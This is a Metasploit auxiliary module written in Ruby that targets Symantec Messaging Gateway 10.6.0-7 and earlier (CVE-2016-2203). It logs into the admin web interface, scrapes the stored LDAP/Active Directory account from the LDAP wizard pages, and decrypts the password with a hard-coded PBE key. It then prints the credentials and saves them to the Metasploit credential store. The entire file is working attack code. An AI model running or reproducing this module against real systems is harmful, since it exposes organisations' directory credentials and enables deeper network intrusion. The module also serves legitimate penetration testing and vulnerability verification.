##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require "base64"
require 'digest'
require "openssl"


class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Symantec Messaging Gateway 10 LDAP Creds Graber',
      'Description'    => %q{
          This module will  grab the AD account saved in Symantec Messaging Gateway and then decipher it using the disclosed symantec pbe key.  Note that authentication is required in order to successfully grab the LDAP credentials, you need at least a read account. Version 10.6.0-7 and earlier are affected

      },
      'References'     =>
        [
          ['URL','https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20160418_00'],
          ['CVE','2016-2203'],
          ['BID','86137']
        ],

      'Author'         =>
        [
          'Fakhir Karim Reda <karim.fakhir[at]gmail.com>',
        ],
       'DefaultOptions' =>
        {
          'SSL' => true,
          'SSLVersion' => 'TLS1',
          'RPORT' => 443
        },
       'License'        => MSF_LICENSE,
       'DisclosureDate' => "Dec 17 2015"
    ))
    register_options(
      [
        OptInt.new('TIMEOUT', [true, 'HTTPS connect/read timeout in seconds', 1]),
        Opt::RPORT(443),
        OptString.new('USERNAME', [true, 'The username to login as']),
        OptString.new('PASSWORD', [true, 'The password to login with'])
      ], self.class)
    deregister_options('RHOST')
  end


  def print_status(msg='')
    super("#{peer} - #{msg}")
  end

  def print_good(msg='')
    super("#{peer} - #{msg}")
  end

  def print_error(msg='')
    super("#{peer} - #{msg}")
  end

  def report_cred(opts)
   service_data = {
    address: opts[:ip],
    port: opts[:port],
    service_name: 'LDAP',
    protocol: 'tcp',
    workspace_id: myworkspace_id
   }
   credential_data = {
    origin_type: :service,
    module_fullname: fullname,
    username: opts[:user],
    private_data: opts[:password],
    private_type: :password
   }.merge(service_data)
   login_data = {
    last_attempted_at: DateTime.now,
    core: create_credential(credential_data),
    status: Metasploit::Model::Login::Status::SUCCESSFUL,
    proof: opts[:proof]
   }.merge(service_data)

   create_credential_login(login_data)
  end

  def auth(username, password, sid, last_login)
    # Real JSESSIONID  cookie
    sid2 = ''
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => '/brightmail/login.do',
      'headers'   => {
        'Referer' => "https://#{peer}/brightmail/viewLogin.do",
        'Connection' => 'keep-alive'
      },
      'cookie'    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
      'vars_post' => {
        'lastlogin'  => last_login,
        'userLocale' => '',
        'lang'       => 'en_US',
        'username'   => username,
        'password'   => password,
        'loginBtn'   => 'Login'
      }
    })
   if res.body =~ /Logged in/
      sid2 = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''
      return sid2
   end
   if res and res.headers['Location']
     mlocation = res.headers['Location']
     new_uri = res.headers['Location'].scan(/^http:\/\/[\d\.]+:\d+(\/.+)/).flatten[0]
     res = send_request_cgi({
        'uri'    => new_uri,
        'cookie' => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}"
     })
     sid2 = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''
     return sid2  if res and res.body =~ /Logged in/
   end
   return false
  end

  def get_login_data
    sid        = ''  #From cookie
    last_login = ''  #A hidden field in the login page
    res = send_request_raw({'uri'=>'/brightmail/viewLogin.do'})
    if res and !res.get_cookies.empty?
      sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''
    end
    if res
      last_login = res.body.scan(/<input type="hidden" name="lastlogin" value="(.+)"\/>/).flatten[0] || ''
    end
    return sid, last_login
  end

  # Returns the status of the listening port.
  #
  # @return [Boolean] TrueClass if port open, otherwise FalseClass.

  def port_open?
    begin
      res = send_request_raw({'method' => 'GET', 'uri' => '/'}, datastore['TIMEOUT'])
      return true if res
    rescue ::Rex::ConnectionRefused
      print_status("#{peer} - Connection refused")
      return false
    rescue ::Rex::ConnectionError
      print_error("#{peer} - Connection failed")
      return false
    rescue ::OpenSSL::SSL::SSLError
      print_error("#{peer} - SSL/TLS connection error")
      return false
    end
  end

  # Returns the derived key from the password, the salt and the iteration count number.
  #
  # @return Array of byte containing the derived key.
  def get_derived_key(password, salt, count)
    key = password + salt
    for i in 0..count-1
        key = Digest::MD5.digest(key)
    end
    kl = key.length
    return key[0,8], key[8,kl]
  end


  # @Return the deciphered password
  # Algorithm obtained by reversing the firmware
  #
  def decrypt(enc_str)
    pbe_key="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,./<>?;':\"\\{}`~!@#$%^&*()_+-="
    salt = (Base64.strict_decode64(enc_str[0,12]))
    remsg = (Base64.strict_decode64(enc_str[12,enc_str.length]))
    (dk, iv) = get_derived_key(pbe_key, salt, 1000)
    alg = "des-cbc"
    decode_cipher = OpenSSL::Cipher::Cipher.new(alg)
    decode_cipher.decrypt
    decode_cipher.padding = 0
    decode_cipher.key = dk
    decode_cipher.iv = iv
    plain = decode_cipher.update(remsg)
    plain << decode_cipher.final
    return  plain.gsub(/[\x01-\x08]/,'')
  end

 def grab_auths(sid,last_login)
  token = '' #from hidden input
  selected_ldap = '' # from checkbox input
  new_uri = '' # redirection
  flow_id = '' # id of the flow
  folder = '' # symantec folder
  res = send_request_cgi({
   'method'    => 'GET',
   'uri'       => "/brightmail/setting/ldap/LdapWizardFlow$exec.flo",
   'headers'   => {
    'Referer' => "https://#{peer}/brightmail/setting/ldap/LdapWizardFlow$exec.flo",
    'Connection' => 'keep-alive'
   },
   'cookie'    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid};"
   })
   if res
    token = res.body.scan(/<input type="hidden" name="symantec.brightmail.key.TOKEN" value="(.+)"\/>/).flatten[0] || ''
    selected_ldap = res.body.scan(/<input type="checkbox" value="(.+)" name="selectedLDAP".+\/>/).flatten[0] || ''
   else
    return false
   end
   res = send_request_cgi({
    'method'    => 'POST',
    'uri'       => "/brightmail/setting/ldap/LdapWizardFlow$edit.flo",
    'headers'   => {
     'Referer' => "https://#{peer}/brightmail/setting/ldap/LdapWizardFlow$exec.flo",
     'Connection' => 'keep-alive'
    },
    'cookie'    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}; ",
    'vars_post'  => {
     'flowId'  => '0',
     'userLocale' => '',
     'lang'       => 'en_US',
     'symantec.brightmail.key.TOKEN'=> "#{token}",
     'selectedLDAP' => "#{selected_ldap}"
    }
   })
   if res and res.headers['Location']
    mlocation = res.headers['Location']
    new_uri = res.headers['Location'].scan(/^https:\/\/[\d\.]+(\/.+)/).flatten[0]
    flow_id =  new_uri.scan(/.*\?flowId=(.+)/).flatten[0]
    folder = new_uri.scan(/(.*)\?flowId=.*/).flatten[0]
   else
    return false
   end
   res = send_request_cgi({
    'method'    => 'GET',
    'uri'       => "#{folder}",
    'headers'   => {
     'Referer' => "https://#{peer}/brightmail/setting/ldap/LdapWizardFlow$exec.flo",
     'Connection' => 'keep-alive'
    },
    'cookie'    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}; ",
    'vars_get'  => {
     'flowId'  => "#{flow_id}",
     'userLocale' => '',
     'lang'       => 'en_US'
    }
   })
   if res and res.code == 200
    login = res.body.scan(/<input type="text" name="userName".*value="(.+)"\/>/).flatten[0] || ''
    password = res.body.scan(/<input type="password" name="password".*value="(.+)"\/>/).flatten[0] || ''
    host =  res.body.scan(/<input name="host" id="host" type="text" value="(.+)" class/).flatten[0] || ''
    port =  res.body.scan(/<input name="port" id="port" type="text" value="(.+)" class/).flatten[0] || ''
    password = decrypt(password)
    print_good("Found login = '#{login}' password = '#{password}' host ='#{host}' port = '#{port}' ")
    report_cred(ip: host, port: port, user:login, password: password, proof: res.code.to_s)
   end
  end

  def run_host(ip)
    return unless port_open?
    sid, last_login = get_login_data
    if sid.empty? or last_login.empty?
      print_error("#{peer} - Missing required login data.  Cannot continue.")
      return
    end
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    sid = auth(username, password, sid, last_login)
    if not sid
      print_error("#{peer} - Unable to login.  Cannot continue.")
      return
    else
      print_good("#{peer} - Logged in as '#{username}:#{password}' Sid: '#{sid}' LastLogin '#{last_login}'")
    end
    grab_auths(sid,last_login)
  end
end
